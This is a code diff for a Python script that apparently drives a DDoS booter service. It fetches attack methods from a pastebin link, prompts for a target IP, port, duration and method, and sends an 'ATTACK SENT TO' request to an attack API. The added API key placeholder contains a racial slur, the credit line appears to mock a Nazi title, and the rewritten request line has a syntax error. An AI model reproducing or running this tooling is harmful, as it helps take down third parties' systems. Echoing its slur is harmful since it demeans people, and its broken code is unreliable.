@@ -10,6 +10,7 @@ max_time = "300s | 5min"
 
 methods_from_api = str("https://pastebin.com/raw/5iBn9TAQ")
 api = str("https://example.com/")
+key = str("niggayourkeygoeshere")
 
 goodbye_banner = str("\nCreated By Furher Acker\n Hope You Enjoyed")
 
@@ -46,7 +47,7 @@ def attack_menu():
        x = requests.get(methods_from_api)
        print(x.text)
        method = input("METHOD: ")
-       h = requests.get(api+ip+port+attk_time+method)
+       h = requests.get(api+"?key7="key+"&&ip="+ip+"&&port="+port+"&&time="+attk_time+"&&method="+method)
        print(f"{h}")
        print(f"ATTACK SENT TO: {ip} ON PORT {port} FOR {attk_time} WITH METHOD {method}")
        time.sleep(3)
